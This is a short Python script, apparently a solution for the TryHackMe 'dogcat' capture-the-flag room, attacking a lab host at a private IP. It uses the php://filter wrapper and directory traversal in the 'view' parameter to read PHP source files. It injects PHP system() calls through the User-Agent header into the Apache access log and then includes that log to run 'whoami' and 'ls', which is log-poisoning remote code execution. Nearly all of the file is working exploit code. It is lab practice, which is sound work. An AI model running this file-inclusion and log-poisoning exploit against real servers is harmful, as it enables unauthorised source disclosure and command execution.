#!/usr/bin/python3
#run   ./view-php-filter.py
# https://github.com/sebastiendamaye/TryHackMe/blob/master/dogcat/files/req.py
import requests

target = "http://10.10.157.124"

def req(url, param='', useragent=''):
	url = target+param
	if useragent != '':
		headers = { 'User-Agent':useragent }
	else:
		headers = {}
	print("[DEBUG] URL=%s" % url)
	r = requests.get(url, headers=headers)
	return r.text


# Request main page
print("\n        ------------------  request main page ---------------\n")
print(req(target))


# Request main page index.php
print("\n        ------------------  index.php source file ---------------\n")
 
# Using the filter  php://filter/read=convert.base64-encode/resource=./dog/../index 
# We can read the php code otherwise it will be excuted
print(req(target, param="?view=php://filter/read=convert.base64-encode/resource=./dog/../index"))

# Request dog page
print("-- dog.php source file---")
print(req(target, param="?view=php://filter/read=convert.base64-encode/resource=./dog"))

# Request cat page
print("-- cat.php source file---")
print(req(target, param="?view=php://filter/read=convert.base64-encode/resource=./cat"))




# whoami
print("-- whoami---")
req(target, useragent="<?php system('whoami');?>")
#print(req(target, param="?view=./dog/../../../../var/log/apache2/access.log&ext"))

# ls /var/www/html
print("-- ls /var/www/html ---")
req(target, useragent="<?php system('ls');?>")
print(req(target, param="?view=./dog/../../../../var/log/apache2/access.log&ext"))


